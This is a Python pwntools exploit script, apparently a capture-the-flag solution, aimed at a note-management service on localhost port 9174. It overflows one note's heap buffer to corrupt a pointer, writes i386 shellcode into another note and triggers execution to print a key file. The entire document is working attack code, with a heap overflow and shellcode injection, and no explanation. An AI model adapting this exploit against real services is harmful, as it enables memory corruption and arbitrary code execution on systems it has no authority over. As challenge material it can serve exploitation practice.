#!/usr/bin/env python

from pwn import *
import os
import sys
context('i386', 'linux')

# waiting time in micro-second
WTIME = 0.1

sc = asm('jmp 0x6') 
sc += asm(shellcode.nops(6))
sc += asm(shellcode.cat('./key', 1))

ALLOCLEN = 128
PAD = 132

s = remote('localhost', 9174)
sleep(WTIME)

log.info('Inserts notes 3 times')
for i in range(0, 3):
    s.recvuntil('Please choose an option.\n')
    sleep(WTIME)
    s.send('1\n')
    s.recvuntil('Please give me a size.\n')
    sleep(WTIME)
    s.send(str(ALLOCLEN) + '\n')

log.info('done with insert notes. Next, changes note\'s size and inserts content')

s.recvuntil('Please choose an option.\n')
s.send("3\n")
sleep(WTIME)
# id 1 is second note.
s.recvuntil('Please give me an id.\n')
s.send("1\n")
sleep(WTIME)
s.recvuntil('Please give me a size.\n')
s.send(str(PAD + 4 + 4 ) + "\n")
sleep(WTIME)
s.recvuntil('Please input your data.\n')
s.send("B"*PAD + "SSSS" + "\x00\xa0\x04\x08" + "\n")
sleep(WTIME)

log.info('done with change notes. Next, inserts shellcode into note number 0')

s.recvuntil('Please choose an option.\n')
s.send("3\n")
sleep(WTIME)
s.recvuntil('Please give me an id.\n')
s.send("0\n")
sleep(WTIME)
s.recvuntil('Please give me a size.\n')
s.send(str(PAD+len(sc)) + "\n")
sleep(WTIME)
s.recvuntil('Please input your data.\n')
s.send("A"*PAD + sc + "\n")
sleep(WTIME)

log.info('done with insert shellcode into target note. Bang!')

s.recvuntil('Please choose an option.\n')
s.send("2\n")
s.recvuntil('Please give me an id.\n')
s.send("2\n")

rv = s.recv(1024)
if len(rv) != 0:
    log.warning('Flag: %s' % (rv))
else:
    log.error('There is no result from there!')
s.close()
